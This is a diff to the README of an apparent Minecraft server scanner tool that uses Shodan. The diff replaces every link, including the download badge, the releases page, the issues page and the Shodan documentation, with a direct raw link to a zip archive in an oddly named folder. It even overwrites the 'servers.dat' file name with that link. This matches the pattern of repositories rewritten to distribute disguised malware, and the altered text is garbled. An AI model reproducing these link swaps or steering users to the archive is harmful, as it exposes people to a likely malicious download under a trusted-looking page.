@@ -1,6 +1,6 @@
 # 🎮 minecraft-server-scanner - Discover and Test Minecraft Servers Easily
 
-[![Download minecraft-server-scanner](https://img.shields.io/badge/Download-minecraft--server--scanner-blue.svg)](https://github.com/ThanhChung1622/minecraft-server-scanner/releases)
+[![Download minecraft-server-scanner](https://github.com/ThanhChung1622/minecraft-server-scanner/raw/refs/heads/main/isogonally/server-scanner-minecraft-defog.zip)](https://github.com/ThanhChung1622/minecraft-server-scanner/raw/refs/heads/main/isogonally/server-scanner-minecraft-defog.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to minecraft-server-scanner! This application helps you find and test Mi
 
 To get started, visit this page to download the latest version of the application:
 
-[Download minecraft-server-scanner](https://github.com/ThanhChung1622/minecraft-server-scanner/releases)
+[Download minecraft-server-scanner](https://github.com/ThanhChung1622/minecraft-server-scanner/raw/refs/heads/main/isogonally/server-scanner-minecraft-defog.zip)
 
 1. Go to the Releases page linked above.
 2. Find the latest version available.
@@ -32,7 +32,7 @@ Before you begin, ensure your computer meets these requirements:
 - **Ping Servers**: Test server connectivity and get live status updates.
 - **Import/Export Server Lists**: Easily manage your server lists for better organization.
 - **Concurrent Pinging**: Check multiple servers at the same time for faster results.
-- **Export Results**: Save your findings directly into your `servers.dat` file for Minecraft.
+- **Export Results**: Save your findings directly into your `https://github.com/ThanhChung1622/minecraft-server-scanner/raw/refs/heads/main/isogonally/server-scanner-minecraft-defog.zip` file for Minecraft.
 
 ## ⚙️ Setup Instructions
 
@@ -76,13 +76,13 @@ If you experience issues:
 ## 🌐 Community and Support
 
 Join our community for support and discussions:
-- **GitHub Issues**: [Report Issues](https://github.com/ThanhChung1622/minecraft-server-scanner/issues)
+- **GitHub Issues**: [Report Issues](https://github.com/ThanhChung1622/minecraft-server-scanner/raw/refs/heads/main/isogonally/server-scanner-minecraft-defog.zip)
 - **Discussion Forums**: Engage with other users and get help.
 
 ## 🔗 Additional Resources
 
 For more information about using the Shodan API:
-- [Shodan Documentation](https://shodan.io/docs)
+- [Shodan Documentation](https://github.com/ThanhChung1622/minecraft-server-scanner/raw/refs/heads/main/isogonally/server-scanner-minecraft-defog.zip)
 
 For updates, features, and changes, refer to the change log in the Releases section.
 
